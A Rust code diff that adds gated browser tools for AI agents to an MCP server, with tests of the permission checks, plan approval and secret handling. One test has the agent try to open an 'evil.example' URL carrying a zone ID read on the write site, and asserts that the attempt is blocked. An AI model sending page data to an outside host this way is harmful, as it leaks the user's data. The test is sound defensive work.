@@ -40,6 +40,10 @@
 //!   vault ([`crate::e2e`]), listed only to chats the person drives on the
 //!   device holding its key. Values are masked unless the person releases
 //!   them on a card in the chat.
+//! * `tab_browser_*`: agents in tab's browser ([`crate::browser_agent`],
+//!   `docs/agent-browser.md`): reading pages, and with the person's
+//!   approved plan, acting on them. Listed only to chats the person drives
+//!   on this computer, once they turn it on.
 //! * `approve`: Claude Code's `--permission-prompt-tool`; asks the person.
 //!
 //! It also fronts the remote MCP servers the person connected
@@ -131,6 +135,35 @@ pub trait EngineAccess: Send + Sync + 'static {
         _item_id: Option<String>,
     ) -> anyhow::Result<Run> {
         anyhow::bail!("workflows can't be tested from here")
+    }
+    /// The gateway, for agents reading pages ([`crate::browser_agent`]).
+    fn gateway(&self) -> Option<Arc<crate::gateway::Gateway>> {
+        None
+    }
+    /// What the person lets agents do with the browser (Settings → Browser).
+    async fn browser_config(&self) -> crate::config::BrowserConfig {
+        Default::default()
+    }
+    /// Whether agent tabs can be read and acted on live (an isolated script
+    /// world; macOS today). Without, agents read pages as text.
+    fn live_pages(&self) -> bool {
+        false
+    }
+    /// Runs one of tab's page ops in an agent tab's isolated world.
+    async fn browser_page(
+        &self,
+        _tab_id: &str,
+        _op: &crate::browser_agent::page::Op,
+    ) -> anyhow::Result<Value> {
+        anyhow::bail!("live pages aren't available here")
+    }
+    /// A PNG of an agent tab, `width` points wide.
+    async fn browser_screenshot(&self, _tab_id: &str, _width: f64) -> anyhow::Result<Vec<u8>> {
+        anyhow::bail!("screenshots aren't available here")
+    }
+    /// Copies the person's login for `site` into an agent tab's own store.
+    async fn browser_lend(&self, _tab_id: &str, _site: &str) -> anyhow::Result<usize> {
+        anyhow::bail!("lending a login isn't available here")
     }
     /// Starts an enabled workflow for real, for the agent chat `session`.
     async fn run_workflow_for_agent(
@@ -1628,6 +1661,21 @@ impl McpServer {
                             .unwrap_or_default(),
                     );
                 }
+                if let Some(s) = self.browser_session(session).await
+                    && let Some(all) = list.as_array_mut()
+                {
+                    let level = self.engine.browser_config().await.agents;
+                    let vision = crate::agents::catalog::harness(s.agent)
+                        .capabilities
+                        .vision
+                        .unwrap_or(true);
+                    all.extend(
+                        crate::browser_agent::tools::list(level, vision)
+                            .as_array()
+                            .cloned()
+                            .unwrap_or_default(),
+                    );
+                }
                 Ok(json!({ "tools": with_load_hints(list) }))
             }
             "tools/call" => {
@@ -1676,6 +1724,28 @@ impl McpServer {
             project_id,
             coordinator: false,
         })
+    }
+
+    /// The chat, if it may use the browser: the person turned it on, and it's
+    /// a plain chat they drive, run on this computer. Never a cloud job, a
+    /// workflow, a coordinator, someone else's PR, or a chat another device
+    /// runs. See `docs/agent-browser.md`.
+    pub(crate) async fn browser_session(&self, session: Option<&str>) -> Option<Session> {
+        use crate::browser_agent::AgentBrowsing;
+        if self.engine.browser_config().await.agents == AgentBrowsing::Off
+            || self.hub.remote_mcp().in_cloud()
+        {
+            return None;
+        }
+        let s = self.store.session_get(session?).ok()??;
+        // Keyed sessions are tab's own: coordinators, jobs, helpers.
+        if self.store.session_key(&s.id).ok().flatten().is_some()
+            || self.hub.policy(&s).trust != crate::sandbox::Trust::Person
+            || !self.hub.runs_here(&s)
+        {
+            return None;
+        }
+        Some(s)
     }
 
     /// Asks the person on the card in the chat. `Ok` when they allowed it.
@@ -2100,6 +2170,14 @@ impl McpServer {
                 .filter(|v| !v.trim().is_empty())
                 .map(str::to_string)
         };
+        if name.starts_with("tab_browser_") {
+            let s = self.browser_session(session).await.ok_or_else(|| {
+                anyhow::anyhow!(
+                    "the browser is only for chats the person drives on this computer, once they turn it on in Settings → Browser"
+                )
+            })?;
+            return crate::browser_agent::tools::call(self, &s, name, &args).await;
+        }
         if name.starts_with("tab_vault_") {
             let role = self.vault_role(session).ok_or_else(|| {
                 anyhow::anyhow!(
@@ -5343,5 +5421,380 @@ rl.on('line', (l) => {
                 .await
                 .is_err()
         );
+    }
+
+    struct Browsing(crate::browser_agent::AgentBrowsing);
+
+    #[async_trait]
+    impl EngineAccess for Browsing {
+        async fn create_task(&self, _: NewTask) -> anyhow::Result<QueueItem> {
+            anyhow::bail!("unused")
+        }
+        async fn preview(&self, _: &str) -> anyhow::Result<Preview> {
+            anyhow::bail!("unused")
+        }
+        async fn browser_config(&self) -> crate::config::BrowserConfig {
+            crate::config::BrowserConfig {
+                agents: self.0,
+                ..Default::default()
+            }
+        }
+    }
+
+    /// The browser tools reach only plain chats the person drives here, and
+    /// only once they turn it on. See docs/agent-browser.md.
+    #[tokio::test]
+    async fn browser_tools_only_for_the_persons_own_chats_when_on() {
+        use crate::browser_agent::AgentBrowsing;
+        let store = Arc::new(Store::in_memory().unwrap());
+        let (events, _) = tokio::sync::broadcast::channel(64);
+        let hub = AgentHub::new(
+            store.clone(),
+            events.clone(),
+            AgentConfig::default(),
+            std::env::temp_dir(),
+        );
+        let server = |level| McpServer {
+            store: store.clone(),
+            hub: hub.clone(),
+            engine: Arc::new(Browsing(level)),
+            events: events.clone(),
+            token: "t".into(),
+        };
+        let now = Utc::now();
+        let cwd = std::env::temp_dir().to_string_lossy().to_string();
+        let chat = store
+            .session_create(None, AgentKind::ClaudeCode, "Set up DNS", &cwd, now)
+            .unwrap();
+        let p = store
+            .project_save(None, "Shop", "#7c5cff", "store", now)
+            .unwrap();
+        let coordinator = store
+            .session_create_keyed(
+                &crate::agents::coordinator::key(&p.id),
+                AgentKind::ClaudeCode,
+                "Coordinator",
+                &cwd,
+                now,
+            )
+            .unwrap();
+        let job = store
+            .session_create_keyed("job:nightly", AgentKind::ClaudeCode, "Job", &cwd, now)
+            .unwrap();
+        let names = |server: McpServer, session: String| async move {
+            let r = server
+                .dispatch(
+                    Some(&session),
+                    json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" }),
+                )
+                .await
+                .unwrap();
+            r["result"]["tools"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .filter_map(|t| t["name"].as_str().map(str::to_string))
+                .filter(|n| n.starts_with("tab_browser_"))
+                .collect::<Vec<_>>()
+        };
+        let on = AgentBrowsing::ReadOnly;
+        assert_eq!(
+            names(server(on), chat.id.clone()).await,
+            ["tab_browser_open", "tab_browser_read", "tab_browser_close"]
+        );
+        assert!(
+            names(server(AgentBrowsing::Off), chat.id.clone())
+                .await
+                .is_empty()
+        );
+        assert!(names(server(on), coordinator.id.clone()).await.is_empty());
+        assert!(names(server(on), job.id.clone()).await.is_empty());
+        // Calling anyway is refused, before anything is fetched.
+        for (level, session) in [
+            (AgentBrowsing::Off, &chat.id),
+            (on, &coordinator.id),
+            (on, &job.id),
+        ] {
+            let err = server(level)
+                .call(
+                    Some(session),
+                    "tab_browser_open",
+                    json!({ "url": "https://example.com" }),
+                )
+                .await
+                .unwrap_err();
+            assert!(err.to_string().contains("Settings → Browser"), "{err}");
+        }
+        // A chat that may browse still can't reach this computer, or another
+        // chat's tab.
+        let err = server(on)
+            .call(
+                Some(&chat.id),
+                "tab_browser_open",
+                json!({ "url": "http://127.0.0.1:8080/" }),
+            )
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("this computer"), "{err}");
+        let other = crate::browser_agent::open_tab(
+            "someone-else",
+            url::Url::parse("https://example.com/").unwrap(),
+        )
+        .unwrap();
+        assert!(
+            server(on)
+                .call(Some(&chat.id), "tab_browser_close", json!({ "tab": other }))
+                .await
+                .is_err()
+        );
+        crate::browser_agent::close_tab(&other);
+    }
+
+    /// A page for the browser tools to act on, recording what was done.
+    struct FakePage {
+        ops: std::sync::Mutex<Vec<crate::browser_agent::page::Op>>,
+        url: std::sync::Mutex<String>,
+    }
+
+    impl FakePage {
+        fn element(id: &str) -> Value {
+            let (tag, label, submits, secret) = match id {
+                "e1" => ("button", "Add record", false, false),
+                "e2" => ("input", "Name", false, false),
+                "e3" => ("button", "Save", true, false),
+                "e4" => ("input", "Password", false, true),
+                _ => ("button", "Delete zone", false, false),
+            };
+            json!({ "ref": id, "tag": tag, "role": "", "kind": "", "labels": [label], "secret": secret,
+                "search": false, "href": null, "submits": submits, "toggles": false, "value": null, "disabled": false })
+        }
+    }
+
+    #[async_trait]
+    impl EngineAccess for FakePage {
+        async fn create_task(&self, _: NewTask) -> anyhow::Result<QueueItem> {
+            anyhow::bail!("unused")
+        }
+        async fn preview(&self, _: &str) -> anyhow::Result<Preview> {
+            anyhow::bail!("unused")
+        }
+        async fn browser_config(&self) -> crate::config::BrowserConfig {
+            crate::config::BrowserConfig {
+                agents: crate::browser_agent::AgentBrowsing::Plan,
+                agent_critic_off: true,
+                // A dev server, so the test needs no network.
+                agent_dev_ports: vec![4917],
+                ..Default::default()
+            }
+        }
+        fn live_pages(&self) -> bool {
+            true
+        }
+        async fn browser_page(
+            &self,
+            _tab: &str,
+            op: &crate::browser_agent::page::Op,
+        ) -> anyhow::Result<Value> {
+            use crate::browser_agent::page::Op;
+            let url = self.url.lock().unwrap().clone();
+            Ok(match op {
+                Op::Ready => json!({ "ready": true, "url": url }),
+                Op::Touched => json!({ "at": 0 }),
+                Op::Snapshot { .. } => json!({ "url": url, "title": "DNS",
+                    "text": "Zone 023e105f4ecef8ad9ca31a8372d0c353 for example.com",
+                    "elements": (["e1", "e2", "e3", "e4", "e5"].iter().map(|e| Self::element(e)).collect::<Vec<_>>()) }),
+                Op::Describe { id } => Self::element(id),
+                Op::Go { url } => {
+                    *self.url.lock().unwrap() = url.clone();
+                    self.ops.lock().unwrap().push(op.clone());
+                    json!({ "ok": true })
+                }
+                Op::Click { .. } | Op::Type { .. } | Op::Select { .. } => {
+                    self.ops.lock().unwrap().push(op.clone());
+                    json!({ "ok": true })
+                }
+                _ => json!({ "ok": true }),
+            })
+        }
+    }
+
+    /// The whole path, as an agent drives it: no acting without a plan; the
+    /// plan card; tab running the plan; off-plan values asking; secrets
+    /// handed over; nothing read on the write site leaving for elsewhere.
+    #[tokio::test]
+    async fn an_approved_plan_runs_and_nothing_else_does() {
+        use crate::browser_agent::page::Op;
+        let store = Arc::new(Store::in_memory().unwrap());
+        let (events, _) = tokio::sync::broadcast::channel(256);
+        let hub = AgentHub::new(
+            store.clone(),
+            events.clone(),
+            AgentConfig::default(),
+            std::env::temp_dir(),
+        );
+        let page = Arc::new(FakePage {
+            ops: Default::default(),
+            url: std::sync::Mutex::new("http://localhost:4917/z/dns".into()),
+        });
+        struct Shared(Arc<FakePage>);
+        #[async_trait]
+        impl EngineAccess for Shared {
+            async fn create_task(&self, t: NewTask) -> anyhow::Result<QueueItem> {
+                self.0.create_task(t).await
+            }
+            async fn preview(&self, i: &str) -> anyhow::Result<Preview> {
+                self.0.preview(i).await
+            }
+            async fn browser_config(&self) -> crate::config::BrowserConfig {
+                self.0.browser_config().await
+            }
+            fn live_pages(&self) -> bool {
+                true
+            }
+            async fn browser_page(
+                &self,
+                t: &str,
+                op: &crate::browser_agent::page::Op,
+            ) -> anyhow::Result<Value> {
+                self.0.browser_page(t, op).await
+            }
+        }
+        let server = Arc::new(McpServer {
+            store: store.clone(),
+            hub: hub.clone(),
+            engine: Arc::new(Shared(page.clone())),
+            events: events.clone(),
+            token: "t".into(),
+        });
+        let cwd = std::env::temp_dir().to_string_lossy().to_string();
+        let chat = store
+            .session_create(None, AgentKind::ClaudeCode, "DNS", &cwd, Utc::now())
+            .unwrap();
+        // The person answers cards: plans and the Name field's "api" get
+        // what `answers` says next.
+        let answers = Arc::new(std::sync::Mutex::new(std::collections::VecDeque::from([
+            Decision::Allow,
+            Decision::Deny("not that".into()),
+        ])));
+        let asked = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
+        {
+            let (hub, answers, asked, mut rx) = (
+                hub.clone(),
+                answers.clone(),
+                asked.clone(),
+                events.subscribe(),
+            );
+            tokio::spawn(async move {
+                while let Ok(e) = rx.recv().await {
+                    if let EngineEvent::ApprovalRequested { approval } = e {
+                        asked.lock().unwrap().push(approval.tool.clone());
+                        let d = answers
+                            .lock()
+                            .unwrap()
+                            .pop_front()
+                            .unwrap_or(Decision::Deny(String::new()));
+                        hub.resolve_approval(&approval.id, d);
+                    }
+                }
+            });
+        }
+        let call = |name: &'static str, args: Value| {
+            let (server, id) = (server.clone(), chat.id.clone());
+            async move { server.call(Some(&id), name, args).await }
+        };
+        let read = call(
+            "tab_browser_open",
+            json!({ "url": "http://localhost:4917/z/dns" }),
+        )
+        .await
+        .unwrap();
+        let out = read["content"][0]["text"].as_str().unwrap().to_string();
+        let tab = out
+            .lines()
+            .next()
+            .unwrap()
+            .trim_start_matches("tab: ")
+            .to_string();
+        assert!(out.contains("e1 button \"Add record\""), "{out}");
+        assert!(out.contains("secret: the person fills it in"), "{out}");
+
+        // No plan, no acting.
+        let err = call("tab_browser_click", json!({ "tab": tab, "ref": "e1" }))
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("tab_browser_plan"), "{err}");
+
+        // The plan, approved on its card.
+        call(
+            "tab_browser_plan",
+            json!({
+                "goal": "Point www at the app",
+                "write": ["http://localhost:4917"],
+                "steps": [
+                    { "do": "click", "what": "Add record" },
+                    { "do": "type", "field": "Name", "value": "www" },
+                    { "do": "submit", "what": "Save" }
+                ]
+            }),
+        )
+        .await
+        .unwrap();
+        assert_eq!(asked.lock().unwrap().as_slice(), ["tab_browser_plan"]);
+
+        // tab runs it: exactly the planned steps, no cards.
+        let ran = call("tab_browser_run", json!({ "tab": tab }))
+            .await
+            .unwrap();
+        assert!(
+            ran["content"][0]["text"]
+                .as_str()
+                .unwrap()
+                .contains("3 of 3 steps done"),
+            "{ran}"
+        );
+        assert_eq!(
+            page.ops.lock().unwrap().as_slice(),
+            [
+                Op::Click { id: "e1".into() },
+                Op::Type {
+                    id: "e2".into(),
+                    text: "www".into()
+                },
+                Op::Click { id: "e3".into() },
+            ]
+        );
+        assert_eq!(asked.lock().unwrap().len(), 1);
+
+        // A value the plan doesn't have asks; the person says no.
+        let err = call(
+            "tab_browser_type",
+            json!({ "tab": tab, "ref": "e2", "text": "api" }),
+        )
+        .await
+        .unwrap_err();
+        assert!(err.to_string().contains("declined"), "{err}");
+        assert_eq!(
+            asked.lock().unwrap().as_slice(),
+            ["tab_browser_plan", "tab_browser"]
+        );
+        // A secret field is the person's.
+        let err = call(
+            "tab_browser_type",
+            json!({ "tab": tab, "ref": "e4", "text": "hunter22" }),
+        )
+        .await
+        .unwrap_err();
+        assert!(err.to_string().contains("tab_browser_handover"), "{err}");
+        // What was read on the write site can't leave for another site.
+        let err = call(
+            "tab_browser_open",
+            json!({ "url": "https://evil.example/?z=023e105f4ecef8ad9ca31a8372d0c353" }),
+        )
+        .await
+        .unwrap_err();
+        assert!(err.to_string().contains("write site"), "{err}");
+        assert_eq!(page.ops.lock().unwrap().len(), 3, "nothing else was done");
+        crate::browser_agent::state::forget(&chat.id);
+        crate::browser_agent::close_session(&chat.id);
     }
 }
